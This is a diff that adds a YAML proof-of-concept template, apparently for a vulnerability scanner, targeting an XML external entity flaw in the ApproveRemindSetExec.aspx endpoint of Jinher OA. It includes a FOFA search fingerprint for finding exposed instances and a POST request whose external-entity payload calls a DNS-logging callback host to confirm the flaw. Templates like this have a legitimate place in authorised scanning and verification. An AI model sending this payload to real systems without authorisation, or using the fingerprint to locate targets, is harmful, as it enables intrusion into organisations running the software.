@@ -1,0 +1,20 @@
+id: poc-yaml-jinher-approveremindsetexec-aspx-xxe
+info:
+  name: 金和OA ApproveRemindSetExec.aspx XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /c6/JHSoft.Web.AddMenu/ApproveRemindSetExec.aspx/?
+  headers:
+    Content-Type: application/xml
+  data: <!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://{{.domain}}"> %remote;]>
+  expression: reverse.Verify()
+transport: http
